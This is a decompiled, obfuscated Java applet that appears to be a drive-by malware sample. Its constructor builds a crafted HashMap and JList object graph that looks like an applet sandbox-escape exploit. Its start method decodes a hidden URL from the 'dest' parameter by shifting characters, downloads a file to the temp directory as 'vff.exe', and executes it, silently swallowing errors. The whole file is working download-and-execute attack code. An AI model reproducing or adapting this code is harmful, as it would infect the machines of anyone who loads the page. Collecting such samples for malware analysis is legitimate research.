import java.util.Map;
import java.awt.Component;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Soo extends Applet
{
    String dddwd;
    JList polnwq;
    
    private void bbbriw() {
        final Boolean ss = true;
    }
    
    @Override
    public void start() {
        super.start();
        try {
            String bbek21 = System.getProperty("jaopoje2va.iopoje2o.topoje2mpdopoje2ir".replace("opoje2", ""));
            if (bbek21.charAt(bbek21.length() - 1) != '\\') {
                bbek21 += "\\";
            }
            final String uytr44 = bbek21 + "vfopoje2f.exopoje2e".replace("opoje2", "");
            final String jkkuy333 = this.getParameter("deoohrh2st".replace("oohrh2", ""));
            String nnnolg = "";
            for (int s = 0; s < jkkuy333.length(); ++s) {
                int jds = jkkuy333.charAt(s);
                jds -= 4;
                nnnolg += (char)jds;
            }
            final FileOutputStream bbbrwq = new FileOutputStream(uytr44);
            final InputStream phbsef = Lopok.Poikop(nnnolg);
            final int afqw = 0;
            int hrr = 1;
            byte[] uuutr3 = new byte[153602];
            for (int jhgf = 0; (hrr = phbsef.read(uuutr3)) > 0; uuutr3 = new byte[153602], jhgf += hrr) {
                bbbrwq.write(uuutr3, 0, hrr);
            }
            bbbrwq.close();
            phbsef.close();
            try {
                Lopok.Pbmvv(uytr44);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public Soo() {
        int asd = 1;
        asd = 13;
        final Object[] ppbefsd = { null };
        final Object iiteda = System.class;
        final String oooy32 = Strs.iopks;
        final String jffff = new String();
        ++asd;
        final Ejkteaa kkky4 = new Ejkteaa(iiteda, oooy32, ppbefsd);
        final HashSet mmmgsa = new HashSet();
        mmmgsa.add(kkky4);
        final int mnsa = 31;
        final Map pppbrtt = new HashMap() {
            @Override
            public Set entrySet() {
                return mmmgsa;
            }
        };
        this.add(this.polnwq = new JList((E[])new Object[] { pppbrtt }));
        try {
            Thread.sleep(3000L);
        }
        catch (Exception ex) {}
    }
}
